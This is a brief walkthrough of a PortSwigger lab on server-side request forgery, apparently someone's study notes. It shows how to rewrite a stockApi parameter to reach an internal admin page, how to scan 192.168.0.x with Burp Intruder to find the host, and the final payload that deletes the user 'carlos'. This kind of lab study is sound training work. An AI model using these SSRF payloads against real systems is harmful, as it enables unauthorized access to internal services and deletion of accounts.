# [ Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

> tricking the server into making requests from backend server

- intercept the a product stock request

```
POST /product/stock HTTP/2
...
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

- the request makes another request to another backend
- the second backend might have an admin page
- change the `stockApi` to

```
stockApi=http://192.168.0.1:8080/admin
```

- forward the request
- it will respond `HTTP/2 400 Bad Request`
- the admin page is not on another IP `http://192.168.0.x:8080/admin`

> use intruder to find the right IP

- send the modified `/product/stock` request to the intruder
- mark the `x` from the `http://192.168.0.x:8080/admin` with `§`
- change the payload type to numbers and set it 1 to 255
- start a sniper attack
- there will be a 200 status code response, that is the right IP

> the exploit itself

- intercept another stock request
- change the `stockApi` with the new IP

```
stockApi=http://192.168.0.192:8080/admin
```

- foreword the request
- in the response try to delete the `carlos` profile
- that request should look like this

```
GET /http://192.168.0.192:8080/admin/delete?username=carlos HTTP/2
```

- send one of the `/product/stock` request to the repeater
- change the `stockApi` to the delete request

```
stockApi=http://192.168.0.192:8080/admin/delete?username=carlos
```

- send it
